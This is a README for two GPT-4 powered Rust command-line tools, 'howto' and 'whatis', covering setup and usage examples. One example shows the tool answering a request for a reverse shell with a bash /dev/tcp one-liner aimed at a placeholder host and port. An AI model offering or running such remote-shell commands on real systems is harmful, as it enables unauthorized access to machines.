# howto & whatis

Simple, GPT-4 powered, command-line tools designed to assist IT professionals with their daily tasks.

## Setup

1. Set `OPENAI_API_KEY` environment variable containing OpenAI API key.
2. Download the release binaries or (modify the code and) build them by yourself using `cargo build -r`.
3. Place the `howto` and `whatis` binaries in your `PATH`.

## Usage examples

### howto

```shell
$ howto format string in Rust

Use the `format!` macro. For example: `let s = format!("{} {}", "Hello", "World");`

```

#### With verbose flag set (`-v` or `--verbose`)
~~~shell
$ howto format string in Rust -v

In Rust, you can format strings using the `format!` macro. This macro works similarly to `println!`, but instead of printing the output to the console, it returns a `String` with the formatted text.

Here's an example that uses `format!` to insert variables into a string with placeholder syntax:

```rust
fn main() {
    let name = "Alice";
    let age = 30;
    let formatted_string = format!("My name is {} and I am {} years old.", name, age);
    println!("{}", formatted_string); // Prints: My name is Alice and I am 30 years old.
}
```

The `{}` are placeholders for the values of `name` and `age`. The `format!` macro will replace them with the string representation of the corresponding variables.
~~~

~~~shell
$ howto get reverse shell using bash

```bash
bash -i >& /dev/tcp/HOST/PORT 0>&1
```
~~~

### whatis

```shell
$ whatis decoded string: aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUQ==

The decoded string is: https://www.youtube.com/watch?v=dQw4w9WgXcQ

```

```shell
$ whatis lol

Internet slang for "laugh out loud."
```

#### With verbose flag set (`-v` or `--verbose`)

```shell
$ whatis lol -v

"Lol" is an acronym for "laugh out loud." It is commonly used in informal communication, such as text messaging or online chats, to indicate that something is funny or to express amusement.